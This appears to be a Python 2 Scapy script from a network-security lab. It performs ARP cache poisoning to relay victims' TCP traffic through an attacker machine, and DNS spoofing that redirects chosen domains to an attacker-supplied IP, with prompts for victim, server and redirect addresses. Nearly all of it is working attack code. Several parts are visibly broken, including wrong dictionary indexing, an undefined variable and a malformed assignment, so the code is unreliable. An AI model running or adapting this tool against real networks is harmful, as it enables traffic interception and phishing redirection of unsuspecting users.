from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import threading
import time


#macAttacker = "08:00:27:d0:25:4b"
#ipAttacker = "192.168.56.103"

#macVictim = "08:00:27:d0:25:4b"
#ipVictim = "192.168.56.101"
#ipServer = "192.168.56.102"
#Server = "192.168.56.105"

#ipToRedirect = "192.168.56.102"
#domain = "www.google.com"
#iface = "enp0s3"



class Application():
    def __init__(self):
        
        # Checks which IPs are active in the 192.168.56.0/24 range.
        # We use the results to save an intance of the attackers ARP table.
        self.hosts = arping("192.168.56.0/24")
        # Saves the instance of the active IPs.
        self.MAC_ARP_TABLE = {}
        for i in range(len(self.hosts[0])):
            self.MAC_ARP_TABLE[self.hosts[0][i][1][ARP].psrc] = self.hosts[0][i][1][ARP].hwsrc

        #self.interceptedPackets = []
        self.iface = raw_input("Please input the interface: ")
        print("(Network Interface: " + self.iface);
        self.ATTACKER_MAC = raw_input("Please input the Attacker MAC: ")
        print("Attacker MAC: " + self.ATTACKER_MAC);
        self.fieldIPVictim = raw_input("Please input the Victim IPs (use \",\" as divider): ")
        print("Victim IP: " + self.fieldIPVictim);
        self.fieldIPServer = raw_input("Please input the Server IPs (use \",\" as divider): ")
        print("IP Server: " + self.fieldIPServer);


    #When the attack starts)
    def arp_main(self):
        #put input fields into variables
    	self.VICTIM_IP = self.fieldIPVictim.split(",")
        
        self.SERVER_IP = self.fieldIPServer.split(",")

        #First set up thread to poison ARP tables of victims and servers
        poison_thread = threading.Thread(target=self.arp_poisoning)
        poison_thread.daemon=True #The Thread dies when the main thread dies
        poison_thread.start()

        #then set up thread to sniff packets on network to be intercepted
        sniff_thread_victim = threading.Thread(target=self.arp_sniffing_victim)
        sniff_thread_victim.daemon=True
        sniff_thread_victim.start()     
     
     
    def arp_poisoning(self):
        while True:
            for i in range(0,len(self.VICTIM_IP)):
                for j in range(0,len(self.SERVER_IP)):
                    if (self.VICTIM_IP[i]!=self.SERVER_IP[j]):
                        #poison the Victim ARP tables

                        #Poison the Victim ARP tables
                        arp= Ether() / ARP()
                        arp[Ether].src = self.ATTACKER_MAC
                        arp[ARP].hwsrc = self.ATTACKER_MAC
                        arp[ARP].psrc = self.SERVER_IP[j]
                        arp[ARP].hwdst = self.MAC_ARP_TABLE[self.VICTIM_IP[i]]
                        arp[ARP].pdst = self.VICTIM_IP[i]

                        sendp(arp, iface=self.iface)

                        #Poison the Server ARP tables
                        arp= Ether() / ARP()
                        arp[Ether].src = self.ATTACKER_MAC
                        arp[ARP].hwsrc = self.ATTACKER_MAC
                        arp[ARP].psrc = self.VICTIM_IP[i]
                        arp[ARP].hwdst = self.MAC_ARP_TABLE[self.SERVER_IP[j]]
                        arp[ARP].pdst = self.SERVER_IP[j]

                        sendp(arp, iface=self.iface)
                        print("ARP Poisoning  Victim IP: " + str(self.VICTIM_IP[i]) + ", Victim MAC: " + str(self.MAC_ARP_TABLE[self.VICTIM_IP[i]]));
                        print("ARP Poisoning Server IP: " + str(self.SERVER_IP[j]) + ", Server MAC: " + str(self.MAC_ARP_TABLE[self.SERVER_IP[j]]));

            poisonedIPs = [self.VICTIM_IP, self.SERVER_IP]
            time.sleep(40)
    
    #returns boolean whether the packet is one from the Victim which we are interested in
    def sniff_filter(self, pkt):
        #Look for packets which we want to intercept from poisoned ARP tables
        print("sniffing packets")
        pktTCP = pkt.haslayer(TCP) #TCP packet
        packetPoisoned = pkt[Ether].dst == self.ATTACKER_MAC #packet is indeed poisoned

        if pktTCP and packetPoisoned: 
            return True
        else:
            return False    
        
        
    #forward packets meant for a poisoned target
    def arp_sniffing_victim(self):

        def intercept_packet(packet):
            #determine who intercepted packet should be forwarded to
            if packet[IP].dst in self.SERVER_IP:
                index = self.SERVER_IP.index(packet[IP].dst)
                packet[Ether].dst = self.MAC_ARP_TABLE[self.SERVER_IP.index(packet[IP].dst)]
            else:
                index = self.VICTIM_IP.index(packet[IP].dst)
                packet[Ether].dst = self.MAC_ARP_TABLE[self.VICTIM_IP.index(packet[IP].dst)]
            packet[Ether].src = self.ATTACKER_MAC
            sendp(packet, iface=self.iface)

        #filter on packets to be intercepted on network iface, then forward to the server or victim
        sniff(lfilter=self.sniff_filter, prn=intercept_packet, iface=self.iface)


    ### DNS POISONING ###
    def dns_main(self):
        #put input fields into variables
        self.fieldWebsite = raw_input("Please input domains (use \",\" as divider): ")
        print("Website: " + self.fieldWebsite);
        self.fieldRedirectIP = raw_input("Please input the IP address redirect: ")
        print("RedirectIP: " + self.fieldRedirectIP);
        self.VICTIM_IP = self.fieldIPVictim.split(",")

        self.WEBSITE = self.fieldWebsite.split(",")
        self.REDIRECT_TO_IP = self.fieldRedirectIP
        self.SERVER_IP = self.fieldIPServer.split(",")

        #thread for ARP poisoning DNS server and victim
        print("(DNS) Starting the ARP-poison thread to make the following IPs think we (" + self.ATTACKER_MAC + ") are their local DNS: " + str(self.VICTIM_IP))
        rearp_thread = threading.Thread(target=self.dns_arp_poisoning)
        rearp_thread.daemon=True
        rearp_thread.start()
        
        #thread for dns poisoning
        print "(DNS) Starting DNS thread that forwards or poisons DNS requests"
        dns_thread = threading.Thread(target=self.dns_poison, args=(self.WEBSITE, self.SERVER_IP))
        dns_thread.daemon=True #The Thread dies when the main thread dies
        dns_thread.start()
        
    def dns_poison(self, WEBSITE, SERVER):

        def dns_responder():
            print "Starting dns_responder"            

            def forward_dns(orig_pkt):
                print("(DNS) Forwarding: " + orig_pkt[DNSQR].qname)
                #setting up response
                response = sr1(
                    IP(dst=SERVER[0])/
                        UDP(sport=orig_pkt[UDP].sport)/
                        DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
                    verbose=0,
                )
                #forming response packet - determine who packet should be forwarded to
                resp_pkt = IP(dst=orig_pkt[IP].src, src=SERVER[0])/UDP(dport=orig_pkt[UDP].sport)/DNS()
                if orig_pkt[IP].dst in self.SERVER_IP:
                    index = self.SERVER_IP.index(orig_pkt[IP].dst)
                    resp_pkt = [Ether].dst = self.MAC_ARP_TABLE[self.SERVER_IP.index(packet[IP].dst)]
                else:
                    index = self.VICTIM_IP.index(orig_pkt[IP].dst)
                    resp_pkt[Ether].dst = self.MAC_ARP_TABLE[self.VICTIM_IP.index(packet[IP].dst)]
                resp_pkt[Ether].src = self.ATTACKER_MAC
                resp_pkt[DNS] = response[DNS]
                send(resp_pkt, verbose=0)

                return "[DNS] Responding to "+orig_pkt[IP].src
         
            def get_response(pkt):
                if (DNS in pkt):                
                    for i in range(0,len(WEBSITE)):
                        SITE = WEBSITE[i]
                        if SITE in str(pkt["DNS Question Record"].qname):
                            #create packet and send to redirected IP
                            spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id ,ancount=1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=self.REDIRECT_TO_IP)/DNSRR(rrname=SITE,rdata=self.REDIRECT_TO_IP))
                            #ENSURE THAT PACKET FORWARDING IS TURNED OFF!!
                            send(spf_resp, verbose=0, iface=self.iface)
                            return "[DNS] Spoofed DNS Response Sent - Redirected " + SITE + " to "+ self.REDIRECT_TO_IP + " (for client "+ pkt[IP].src +")"

                    # make DNS query, capturing the answer and send the answer
                    return forward_dns(pkt)
         
            return get_response
   
        DNSFilter = "udp port 53 and ip dst "+ SERVER[0] #filter on port 53 of DNS server
        sniff(filter=DNSFilter, prn=dns_responder(), iface=self.iface)

    def dns_arp_poisoning(self):
        while True:
            print "(DNS) Poisoning the ARP Cache of "+ str(self.VICTIM_IP) + " with " + str(self.SERVER_IP) + " as DNS server"
            for i in range(0,len(self.VICTIM_IP)):
                for j in range(0,len(self.SERVER_IP)):

                    #Poison the Server ARP tables
                    arp= Ether() / ARP()
                    arp[Ether].src = self.ATTACKER_MAC
                    arp[ARP].hwsrc = self.ATTACKER_MAC
                    arp[ARP].psrc = self.SERVER_IP[j]
                    arp[ARP].hwdst = self.MAC_ARP_TABLE[self.VICTIM_IP[i]]
                    arp[ARP].pdst = self.VICTIM_IP[i]

                    sendp(arp, iface=self.iface)                    
                    #Poison the Victim ARP tables
                    arp= Ether() / ARP()
                    arp[Ether].src = self.ATTACKER_MAC
                    arp[ARP].hwsrc = self.ATTACKER_MAC
                    arp[ARP].psrc = self.VICTIM_IP[i]
                    arp[ARP].hwdst = self.MAC_ARP_TABLE[self.SERVER_IP[i]]
                    arp[ARP].pdst = self.SERVER_IP[i]

                    sendp(arp, iface=self.iface)

            poisonedIPs = [self.VICTIM_IP, self.SERVER_IP]
            print("Re-poisoned the ARP of the following IPs: " + str(poisonedIPs));
            time.sleep(40)

    def de_poisoning(self):
        for i in range(0,len(self.VICTIM_IP)):
            for j in range(0,len(self.SERVER_IP)):
                if (self.VICTIM_IP[i]!=self.SERVER_IP[j]):
                    #poison the Victim ARP tables
                    arp= Ether() / ARP()
                    arp[Ether].src = self.MAC_ARP_TABLE[self.SERVER_IP[j]]
                    arp[ARP].hwsrc = self.MAC_ARP_TABLE[self.SERVER_IP[j]]
                    arp[ARP].psrc = self.SERVER_IP[j]
                    arp[ARP].hwdst = self.MAC_ARP_TABLE[self.VICTIM_IP[i]]
                    arp[ARP].pdst = self.VICTIM_IP[i]

                    sendp(arp, iface=self.iface)

                    #Poison the IP Webserver ARP tables
                    arp= Ether() / ARP()
                    arp[Ether].src = self.MAC_ARP_TABLE[self.VICTIM_IP[i]]
                    arp[ARP].hwsrc = self.MAC_ARP_TABLE[self.VICTIM_IP[i]]
                    arp[ARP].psrc = self.VICTIM_IP[i]
                    arp[ARP].hwdst = self.MAC_ARP_TABLE[self.SERVER_IP[j]]
                    arp[ARP].pdst = self.SERVER_IP[j]

                    sendp(arp, iface=self.iface)
                    print("De-poisoned")
                    print("ARP Poisoning  Victim IP: " + str(self.VICTIM_IP[i]) + ", Victim MAC: " + str(self.MAC_ARP_TABLE[self.VICTIM_IP[i]]));
                    print("ARP Poisoning Server IP: " + str(self.SERVER_IP[j]) + ", Server MAC: " + str(self.MAC_ARP_TABLE[self.SERVER_IP[j]]));



try:
    packageType = ""
    while packageType != "arp" and packageType != "dns":
        packageType = raw_input("Enter type of poisoning attack - \"arp\" or \"dns\": ")

    app = Application()

    while True:
        if packageType == "arp":
            app.arp_main()
            time.sleep(400000)
        if packageType == "dns":
            app.dns_main()
            time.sleep(400000)

    
except KeyboardInterrupt:
    print("CTRL+C DETECTED, RESTORING IPS")
    app.de_poisoning()

